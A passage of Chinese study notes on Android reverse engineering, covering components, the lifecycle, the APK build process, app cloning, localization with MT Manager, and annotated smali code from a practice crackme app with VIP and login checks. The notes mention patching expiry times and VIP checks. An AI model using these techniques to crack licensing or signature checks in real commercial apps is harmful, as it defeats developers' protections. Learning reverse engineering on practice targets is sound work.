<td align="left">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td>
</tr>
<tr>
<td align="left">Service(服务)</td>
<td align="left">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td>
</tr>
<tr>
<td align="left">Broadcast Receiver(广播接收器)</td>
<td align="left">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td>
</tr>
<tr>
<td align="left">Content Provider(内容提供者)</td>
<td align="left">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td>
</tr>
</tbody></table></div>

        <h3 id="1-Activity"   >
          <a href="#1-Activity" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Activity" class="headerlink" title="1.Activity"></a>1.Activity</h3>
      
        <h4 id="例子解析"   >
          <a href="#例子解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子解析" class="headerlink" title="例子解析"></a>例子解析</h4>
      <p>在<code>AndroidManifest.xml</code>中有一些代码可以查看</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span>  <span class="comment">&lt;!--当前Activity是否可以被另一个Application的组件启动：true允许被启动；false不允许被启动--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>  </span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span>  </span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;</span>  </span><br></pre></td></tr></table></div></figure>

<p>所有界面都是从主要的<code>Activity</code>一步一步启动的，比如启动广告流程：启动<code>Activity</code>-&gt;广告<code>Activity</code>-&gt;主页<code>Activity</code>。</p>

        <h4 id="生命周期"   >
          <a href="#生命周期" class="heading-link"><i class="fas fa-link"></i></a><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">函数名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">onCreate()</td>
<td align="left">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>
</tr>
<tr>
<td align="left">onStart()</td>
<td align="left">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>
</tr>
<tr>
<td align="left">onResume()</td>
<td align="left">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>
</tr>
<tr>
<td align="left">onPause()</td>
<td align="left">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>
</tr>
<tr>
<td align="left">onStop()</td>
<td align="left">这个方法是在Activity完全不可见的时候调用的。</td>
</tr>
<tr>
<td align="left">onDestroy()</td>
<td align="left">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>
</tr>
<tr>
<td align="left">onRestart()</td>
<td align="left">当Activity从停止stop状态恢进入start状态时调用状态。</td>
</tr>
</tbody></table></div>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/105514fnc44338qubb43t3.png" alt="105514fnc44338qubb43t3"></p>

        <h2 id="编译过程"   >
          <a href="#编译过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2>
      <ol>
<li><p><strong>第一步：打包资源文件，生成R.java文件</strong></p>
<p>通过利用aapt资源打包工具，将文件目录中的Resource文件（就是工程中res中的文件）、Assets文件、AndroidManifest.xml文件、Android基础类库（Android.jar文件）进行打包，生成R.java</p>
</li>
<li><p><strong>第二步：aidl生成Java文件</strong></p>
<p>AIDL是Android Interface Definition Language的简称， 是Android跨进程通讯的一种方式。 检索工程里所有的aidl文件，并转换为对应的Java文件</p>
</li>
<li><p><strong>第三步：编译Java文件，生成对应的.class文件</strong></p>
<p>将R.java、aidl生成的Java文件、Java源文件通过JDK携带的Javac编译生成.class文件</p>
</li>
<li><p><strong>第四步：把.class文件转化成Davik VM支持的.dex文件</strong></p>
<p>通过dx工具将.class文件生成为classes.dex</p>
</li>
<li><p><strong>第五步：打包生成未签名的.apk文件</strong></p>
<p>利用apkbuilder工具，将resources.arsc、res目录、AndroidManifest.xml、assets目录、dex文件打包成未签名的apk</p>
</li>
<li><p><strong>第六步：对未签名.apk文件进行签名</strong></p>
<p>使用apksigner为安装包添加签名信息。</p>
</li>
<li><p><strong>第七步：对签名后的.apk文件进行对齐处理</strong></p>
<p>使用zipalign工具对签名包进行内存对齐操作， 即优化安装包的结构。</p>
</li>
</ol>

        <h2 id="双开知识"   >
          <a href="#双开知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#双开知识" class="headerlink" title="双开知识"></a>双开知识</h2>
      <p>即让手机同时运行或多个相同的软件</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">原理</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">修改包名</td>
<td align="left">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP，这个更改的是类似于<code>com.xxx.xxx</code>这个包名，可以在MT/NP管理器中的安装包提取-&gt;提取安装包-&gt;定位-&gt;点击提取的安装包-&gt;功能-&gt;APK共存，之后确认即可。但是这个会修改掉包的签名信息，如果开发者进行了签名校验，则会出错。</td>
</tr>
<tr>
<td align="left">修改Framework</td>
<td align="left">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>
</tr>
<tr>
<td align="left">通过虚拟化技术实现</td>
<td align="left">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>
</tr>
<tr>
<td align="left">以插件机制运行</td>
<td align="left">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
</tr>
</tbody></table></div>
<p>不是很懂，后门应该可以学到</p>

        <h2 id="汉化-1"   >
          <a href="#汉化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#汉化-1" class="headerlink" title="汉化"></a>汉化</h2>
      <p>基本上字符串都是反编译结果的资源文件里面，在<code>arsc</code>里，建议一键汉化，然后再润色。少量没汉化到的字符串参考视频中的方法定位去逐个汉化。</p>
<p>MT管理器-&gt;提取安装包-&gt;点击安装包-&gt;查看-&gt;右上角的三点展开-&gt;搜索(高级搜索)-&gt;文件中包含内容搜索</p>

        <h3 id="XML形式"   >
          <a href="#XML形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#XML形式" class="headerlink" title="XML形式"></a>XML形式</h3>
      <p>一般搜索对应的英文即可，大多保存在<code>xxx.xml</code>文件中，然后修改即可，如下的<code>Hello</code>，修改成中文即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230919205712384.png" alt="image-20230919205712384"></p>
<p>记得勾选签名</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230919205908259.png" alt="image-20230919205908259"></p>

        <h3 id="Arsc形式"   >
          <a href="#Arsc形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#Arsc形式" class="headerlink" title="Arsc形式"></a>Arsc形式</h3>
      <p>在不知道什么语言的时候，可以使用开发者助手来获取文本。</p>
<p>打开开发者助手，然后打开对应的应用中的未知语言所在界面，点击开发者助手小图标，找到界面资源分析，点击开始</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230919212921154.png" alt="image-20230919212921154"></p>
<p>然后关闭进度条的界面，点击对应的文本即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230919213047388.png" alt="image-20230919213047388"></p>
<p>得到对应的文件文本，随后即可进行搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230919213113927.png" alt="image-20230919213113927"></p>
<p>找到之后，选择翻译模式打开，进入<code>default</code>默认栏，然后查找修改即可。</p>

        <h3 id="Dex形式"   >
          <a href="#Dex形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#Dex形式" class="headerlink" title="Dex形式"></a>Dex形式</h3>
      <p>搜索找到文件，使用<code>Dex ++</code>编辑器打开，选择字符串模式进行搜索，然后修改即可。</p>

        <h2 id="smali知识"   >
          <a href="#smali知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#smali知识" class="headerlink" title="smali知识"></a>smali知识</h2>
      <p>可以用语法查询工具，有个<code>apk</code>可以安装，在安卓逆向这档事的课程三中有</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230920172723577.png" alt="image-20230920172723577"></p>

        <h3 id="关键字"   >
          <a href="#关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3>
      <p>在smali语法中的关键字相关含义功能</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.class</td>
<td align="left">类名</td>
</tr>
<tr>
<td align="left">.super</td>
<td align="left">父类名，继承的上级类名名称</td>
</tr>
<tr>
<td align="left">.source</td>
<td align="left">源名</td>
</tr>
<tr>
<td align="left">.field</td>
<td align="left">变量</td>
</tr>
<tr>
<td align="left">.method</td>
<td align="left">方法名</td>
</tr>
<tr>
<td align="left">.register</td>
<td align="left">寄存器</td>
</tr>
<tr>
<td align="left">.end method</td>
<td align="left">方法名的结束</td>
</tr>
<tr>
<td align="left">public</td>
<td align="left">公有</td>
</tr>
<tr>
<td align="left">protected</td>
<td align="left">半公开，只有同一家人才能用</td>
</tr>
<tr>
<td align="left">private</td>
<td align="left">私有，只能自己使用</td>
</tr>
<tr>
<td align="left">.parameter</td>
<td align="left">方法参数</td>
</tr>
<tr>
<td align="left">.prologue</td>
<td align="left">方法开始</td>
</tr>
<tr>
<td align="left">.line xxx</td>
<td align="left">位于第xxx行</td>
</tr>
</tbody></table></div>

        <h3 id="数据类型定义"   >
          <a href="#数据类型定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据类型定义" class="headerlink" title="数据类型定义"></a>数据类型定义</h3>
      <p>smali中一些类型和java的对应关系</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">smali类型</th>
<th align="left">java类型</th>
<th align="left">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">V</td>
<td align="left">void</td>
<td align="left">无返回值</td>
</tr>
<tr>
<td align="left">Z</td>
<td align="left">boolean</td>
<td align="left">布尔值类型，返回0或1</td>
</tr>
<tr>
<td align="left">B</td>
<td align="left">byte</td>
<td align="left">字节类型，返回字节</td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">short</td>
<td align="left">短整数类型，返回数字</td>
</tr>
<tr>
<td align="left">C</td>
<td align="left">char</td>
<td align="left">字符类型，返回字符</td>
</tr>
<tr>
<td align="left">I</td>
<td align="left">int</td>
<td align="left">整数类型，返回数字</td>
</tr>
<tr>
<td align="left">J</td>
<td align="left">long （64位 需要2个寄存器存储）</td>
<td align="left">长整数类型，返回数字</td>
</tr>
<tr>
<td align="left">F</td>
<td align="left">float</td>
<td align="left">单浮点类型，返回数字</td>
</tr>
<tr>
<td align="left">D</td>
<td align="left">double （64位 需要2个寄存器存储）</td>
<td align="left">双浮点类型，返回数字</td>
</tr>
<tr>
<td align="left">string</td>
<td align="left">String</td>
<td align="left">文本类型，返回字符串</td>
</tr>
<tr>
<td align="left">Lxxx/xxx/xxx</td>
<td align="left">object</td>
<td align="left">对象类型，返回对象</td>
</tr>
</tbody></table></div>

        <h3 id="常用指令"   >
          <a href="#常用指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">关键字</th>
<th align="left">注释</th>
<th>例子</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">const</td>
<td align="left">重写整数属性，真假属性内容，只能是数字类型</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">const-string</td>
<td align="left">重写字符串内容</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">const-wide</td>
<td align="left">重写长整数类型，多用于修改到期时间。</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">return</td>
<td align="left">返回指令</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if-eq</td>
<td align="left">全称equal(a=b)，比较寄存器ab内容，相同则跳</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if-ne</td>
<td align="left">全称not equal(a!=b)，ab内容不相同则跳</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if-eqz</td>
<td align="left">全称equal zero(a=0)，z即是0的标记，a等于0则跳</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if-nez</td>
<td align="left">全称not equal zero(a!=0)，a不等于0则跳</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if-ge</td>
<td align="left">全称greater equal(a&gt;=b)，a大于或等于则跳</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if-le</td>
<td align="left">全称little equal(a&lt;=b)，a小于或等于则跳</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">goto</td>
<td align="left">强制跳到指定位置</td>
<td></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">switch</td>
<td align="left">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
<td>.line 54<br/>packed-switch p1, :pswitch_data_0</br><br/>.line 54<br/>:pswitch_data_0<br/>    .packed-switch 0x1<br/>        :pswitch_0<br/>        :pswitch_1<br/>    .end packed-switch</td>
<td align="left">首先会有一个结构packed-switch p1,:pswitch_data_0，代表跳转到pswitch_data_0，然后在pswitch_data_0中具体定义相关的switch结构，变量为p1</td>
</tr>
<tr>
<td align="left">iget</td>
<td align="left">获取寄存器数据</td>
<td></td>
<td align="left"></td>
</tr>
</tbody></table></div>

        <h3 id="寄存器"   >
          <a href="#寄存器" class="heading-link"><i class="fas fa-link"></i></a><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3>
      <p>在<code>smali</code>里的所有操作都必须经过寄存器来进行:本地寄存器用<code>v</code>开头数字结尾的符号来表示，如<code>v0、 v1、v2</code>。 参数寄存器则使用<code>p</code>开头数字结尾的符号来表示，如<code>p0、p1、p2</code>。特别注意的是，<code>p0</code>不一定是函数中的第一个参数，在非<code>static</code>函数中，<code>p0</code>代指<code>“this&quot;</code>，<code>p1</code>表示函数的第一个 参数，<code>p2</code>代表函数中的第二个参数。而在<code>static</code>函数中<code>p0</code>才对应第一个参数(因为<code>Java</code>的<code>static</code>方法中没有<code>this</code>方法）</p>

        <h3 id="例子解析-1"   >
          <a href="#例子解析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子解析-1" class="headerlink" title="例子解析"></a>例子解析</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">//一个私有、静态、不可变的方法   方法名</span><br><span class="line">.method private static final onCreate$lambda-2(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z //(这里面是方法的参数)这里是方法返回值类型，表示布尔值类型，返回假或真</span><br><span class="line">    .registers 7  //寄存器数量</span><br><span class="line"></span><br><span class="line">    .line 33  //代码所在的行数</span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  //读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span><br><span class="line"></span><br><span class="line">    const/4 p5, 0x1  //p5赋值1</span><br><span class="line"></span><br><span class="line">    const/16 v0, 0xa //v0赋值10，在16进制里a表示10</span><br><span class="line"></span><br><span class="line">    if-ge p0, v0, :cond_15  //判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span><br><span class="line"></span><br><span class="line">    .line 34  //以下是常见的Toast弹窗代码</span><br><span class="line">    check-cast p1, Landroid/content/Context; //检查Context对象引用</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;请先获取10个硬币哦&quot; //弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; //检查CharSequence对象引用</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    //将弹窗文本、显示时间等信息传给p1</span><br><span class="line"></span><br><span class="line">    move-result-object p0  //结果传递给p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  //当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span><br><span class="line"></span><br><span class="line">    goto :goto_31  //跳转到:goto_31</span><br><span class="line"></span><br><span class="line">    :cond_15 //跳转的一个地址</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  //判断isvip方法的返回值是否为真(即结果是否为1)</span><br><span class="line"></span><br><span class="line">    move-result p0  //结果赋值给p0</span><br><span class="line"></span><br><span class="line">    if-eqz p0, :cond_43 //如果结果为0则跳转cond_43地址</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0018  //在arsc中的id索引，这个值可以进行查询</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V //设置图片资源</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0008</span><br><span class="line"></span><br><span class="line">    .line 38</span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d000a</span><br><span class="line"></span><br><span class="line">    .line 39</span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line 40</span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const/4 p2, 0x2 //p2赋值2</span><br><span class="line"></span><br><span class="line">    const-string p3, &quot;level&quot; //sp的索引</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V //写入数据</span><br><span class="line"></span><br><span class="line">    goto :goto_50 //跳转地址</span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot; //请先充值大会员哦！</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    return p5  //返回p5的值</span><br><span class="line">.end method //方法结束</span><br><span class="line"></span><br><span class="line">//判断是否是大会员的方法</span><br><span class="line">.method public final isvip()Z</span><br><span class="line">    .registers 2</span><br><span class="line"></span><br><span class="line">    const/4 v0, 0x0 //v0赋值0</span><br><span class="line"></span><br><span class="line">    return v0 //返回v0的值</span><br><span class="line"></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.method public check(Ljava/lang/String;Ljava/lang/String;)V</span><br><span class="line">    .locals 2</span><br><span class="line">    #代表两个变量</span><br><span class="line">    .param p1, &quot;name&quot;    # Ljava/lang/String;</span><br><span class="line">    .param p2, &quot;pass&quot;    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line 32</span><br><span class="line">    const-string v0, &quot;hfdcxy&quot;  #类似全局的字符串</span><br><span class="line"></span><br><span class="line">	#把p1和v0进行equals方法对比</span><br><span class="line">    invoke-virtual &#123;p1, v0&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z</span><br><span class="line"></span><br><span class="line">	#上个函数的执行结果，即equals函数执行结果给到v0</span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">	#v1=0</span><br><span class="line">    const/4 v1, 0x0</span><br><span class="line"></span><br><span class="line">	#如果v0等于0则执行cond_0后面的语句，否则继续往下执行</span><br><span class="line">    if-eqz v0, :cond_0</span><br><span class="line"></span><br><span class="line">	#v0=&quot;1234&quot;</span><br><span class="line">    const-string v0, &quot;1234&quot;</span><br><span class="line"></span><br><span class="line">	#把p2和v0进行equals对比</span><br><span class="line">    invoke-virtual &#123;p2, v0&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z</span><br><span class="line"></span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    if-eqz v0, :cond_0</span><br><span class="line"></span><br><span class="line">    .line 34</span><br><span class="line">    const-string v0, &quot;\u767b\u5f55\u6210\u529f&quot;  #登录成功</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p0, v0, 